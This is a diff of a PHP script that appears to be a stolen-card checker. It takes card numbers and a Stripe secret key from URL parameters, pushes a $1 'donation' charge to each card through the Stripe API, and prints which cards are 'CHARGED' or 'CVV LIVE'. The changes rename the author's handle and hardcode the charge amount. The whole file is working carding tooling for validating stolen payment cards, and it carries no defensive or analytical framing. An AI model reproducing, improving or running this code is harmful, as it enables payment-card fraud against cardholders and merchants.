@@ -1,7 +1,7 @@
 
 
 <?php
-/////////////ゆə͜͡ʍᴏん//////////
+/////////////Hazn//////////
 
 error_reporting(1);
 date_default_timezone_set('America/Buenos_Aires');
@@ -26,11 +26,6 @@ function multiexplode($seperator, $string){
     };
 
 $idd = $_GET['idd'];
-$amt = $_GET['cst'];
-if(empty($amt)) {
-	$amt = '1';
-	$chr = $amt * 100;
-}
 $sk = $_GET['sec'];
 $lista = $_GET['lista'];
     $cc = multiexplode(array(":", "|", ""), $lista)[0];
@@ -113,7 +108,7 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 
 curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$chr.'&currency=usd&payment_method_types[]=card&description=Demon Donation&payment_method='.$tok1.'&confirm=true&off_session=true');  
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=100&currency=usd&payment_method_types[]=card&description=Hazn Donation&payment_method='.$tok1.'&confirm=true&off_session=true');  
 
 $result2 = curl_exec($ch);  
 
@@ -142,7 +137,7 @@ break;
 //=================== [ RESPONSES ] ===================//
 
 if(strpos($result2, '"seller_message": "Payment complete."' )) {
-    echo 'CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: $'.$amt.' CVV Charged ✅ ゆə͜͡ʍᴏん <br> ➤ Receipt : <a href='.$receipturl.'>Here</a><br>';
+    echo 'CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: $1 CVV Charged ✅ Hazn <br> ➤ Receipt : <a href='.$receipturl.'>Here</a><br>';
 }
 elseif(strpos($result2,'"cvc_check": "pass"')){
     echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE</span><br>';
@@ -344,9 +339,6 @@ else {
 
 
 
-
-
-echo " BYPASSING: $x <br>";
 
 
 
